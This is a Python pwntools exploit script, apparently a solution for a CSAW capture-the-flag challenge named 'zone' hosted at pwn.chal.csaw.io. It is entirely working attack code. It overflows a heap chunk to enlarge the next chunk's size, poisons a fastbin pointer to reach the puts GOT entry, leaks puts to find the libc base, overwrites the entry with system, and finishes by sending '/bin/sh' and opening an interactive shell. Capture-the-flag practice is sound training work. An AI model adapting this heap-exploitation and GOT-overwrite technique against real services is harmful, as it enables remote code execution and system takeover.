#!/usr/bin/env python2

from pwn import *
context.log_level = 'DEBUG'
#r = process("./zone")
r = remote("pwn.chal.csaw.io", 5223)
#r = process("./linux_serverx64")
e = ELF("zone")
libc = ELF("libc-2.23.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# allocate a block of size 64, smash next length to 128
r.recvuntil("Exit\n")
r.sendline("1")
r.sendline("64")

r.recvuntil("Exit\n")
r.sendline("3")
r.sendline("a" * 64 + "\x80")

# alloc a new fastbin, free it so it goes on the smallbin list
r.recvuntil("Exit\n")
r.sendline("1")
r.sendline("20")

r.recvuntil("Exit\n")
r.sendline("2")

# alloc our new 'smallbin', smash next fastbin next value
r.recvuntil("Exit\n")
r.sendline("1")
r.sendline("128")

# send 72 bytes + our wanted address
# wanted address is plt["puts"] - 16
wanted = e.got["puts"] - 16
r.recvuntil("Exit\n")
buf = ("a" * 72) + p64(wanted)
r.sendline("3")
r.sendline(buf)

# alloc 2 fastbins

r.recvuntil("Exit\n")
r.sendline("1")
r.sendline("20")

r.recvuntil("Exit\n")
r.sendline("1")
r.sendline("20")

# leak puts
r.recvuntil("Exit\n")
r.sendline("4")
puts_addr = u64(r.recvn(6) + '\x00\x00')
log.info("Puts addr: " + hex(puts_addr))
libc_base = puts_addr - libc.symbols["puts"]
log.info("Libc base: " + hex(libc_base))

# now write system to it
r.recvuntil("Exit\n")
r.sendline("3")
sys_addr = libc_base + libc.symbols["system"]
r.sendline(p64(sys_addr))

# now make a bigbin, and print it out
r.clean()
r.sendline("1")
r.sendline("300")

r.clean()
r.sendline("3")
r.sendline("/bin/sh\x00")

r.clean()
r.sendline("4")

r.interactive()
